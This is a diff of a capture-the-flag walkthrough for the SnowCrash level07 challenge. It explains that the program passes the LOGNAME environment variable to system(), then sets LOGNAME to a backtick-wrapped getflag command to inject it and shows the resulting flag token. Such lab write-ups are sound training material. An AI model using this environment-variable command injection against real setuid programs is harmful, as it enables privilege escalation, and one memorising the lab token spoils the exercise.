@@ -21,9 +21,8 @@ system("/bin/echo level07 "level07
 #The level07 program, get the env variable call LOGNAME, and execute the system function with it.
 #system("/bin/echo ENV_LOGNAME");
 
-#Now we can control the env variable from outside the program if we change it for $(getflag) to print the result of getflag as user flag07.
+#We can control the env variable from outside the program if we change it for $(getflag) we will exec getflag as flag07.
 export LOGNAME="\`getflag\`"
 
-#And since it prints the value of logname, it should print the result of getflag, running a>
 < level07@SnowCrash:~$ ./level07
 > Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
